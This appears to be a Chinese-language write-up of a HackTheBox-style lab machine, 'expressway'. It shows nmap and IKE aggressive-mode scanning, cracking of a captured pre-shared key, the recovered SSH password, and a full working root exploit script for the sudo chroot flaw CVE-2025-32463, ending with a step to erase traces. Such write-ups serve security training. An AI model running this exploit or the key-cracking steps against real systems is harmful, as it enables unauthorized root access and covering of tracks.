## 扫描
nmap扫描
```SHELL
$ nmap -sV -A 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 20:57 EDT
Nmap scan report for 10.10.11.87
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   173.18 ms 10.10.16.1
2   122.59 ms 10.10.11.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.57 seconds

$ nmap -sU --top-ports 100 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 21:09 EDT
Nmap scan report for 10.10.11.87
Host is up (0.15s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 113.54 seconds
```
ike协议扫描
```SHELL
$ ike-scan 10.10.11.87                
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=b35d22b7d3c73706) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.161 seconds (6.21 hosts/sec).  1 returned handshake; 0 returned notify

$ ike-scan -A 10.10.11.87 -Poutput_psk_hash.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=75ad57f4093773b1) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.148 seconds (6.76 hosts/sec).  1 returned handshake; 0 returned notify
```
ike密钥破解
```SHELL
$ psk-crack -d /usr/share/wordlists/rockyou.txt output_psk_hash.txt 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash d9751fca291d5aa798cce2dfad3ae76b5530a18e
Ending psk-crack: 8045040 iterations in 41.847 seconds (192247.06 iterations/sec)
```

## user.txt
ssh登陆
```SHELL
username: ike
password: freakingrockstarontheroad
```

## root.txt
linpeas 显示woot相关为高亮
```SHELL
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                    
/dev/mqueue                                                                                                         
/dev/shm
/etc/vmware-tools/locations.lck
/home/ike
/run/user/1001
/run/user/1001/dbus-1
/run/user/1001/dbus-1/services
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/generator.late
/run/user/1001/systemd/generator.late/app-vmwarex2duser@autostart.service
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1001/systemd/inaccessible
/run/user/1001/systemd/inaccessible/dir
/run/user/1001/systemd/inaccessible/reg
/run/user/1001/systemd/propagate
/run/user/1001/systemd/propagate/.os-release-stage
/run/user/1001/systemd/propagate/.os-release-stage/os-release
/run/user/1001/systemd/units
/tmp
/tmp/esc.sh
/tmp/ex.sh
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/pwned
#)You_can_write_even_more_files_inside_last_directory

/tmp/sudowoot.stage.bZUYba/libnss_
/tmp/sudowoot.stage.bZUYba/libnss_/woot1337.so.2
/tmp/sudowoot.stage.bZUYba/woot
/tmp/sudowoot.stage.bZUYba/woot1337.c
/tmp/sudowoot.stage.bZUYba/woot/etc
/tmp/sudowoot.stage.bZUYba/woot/etc/group
/tmp/sudowoot.stage.bZUYba/woot/etc/nsswitch.conf
/tmp/.X11-unix
/tmp/.XIM-unix
/var/lib/php/sessions
/var/mail/ike
/var/tmp
```

存在CVE-2025-32463提权漏洞
```SHELL
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17

```

EXP
```SHELL
#!/bin/bash  
# sudo-chwoot.sh  
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch  
#                  @ Stratascale Cyber Research Unit (CRU)  
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)  
cd ${STAGE?} || exit 1  
  
cat > woot1337.c<<EOF  
#include <stdlib.h>  
#include <unistd.h>  
  
__attribute__((constructor)) void woot(void) {  
  setreuid(0,0);  
  setregid(0,0);  
  chdir("/");  
  execl("/bin/bash", "/bin/bash", NULL);  
}  
EOF  
  
mkdir -p woot/etc libnss_  
echo "passwd: /woot1337" > woot/etc/nsswitch.conf  
cp /etc/group woot/etc  
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c  
  
echo "woot!"  
sudo -R woot woot  
rm -rf ${STAGE?} ##清理痕迹
```

![](attachments/Pasted%20image%2020250922095553.png)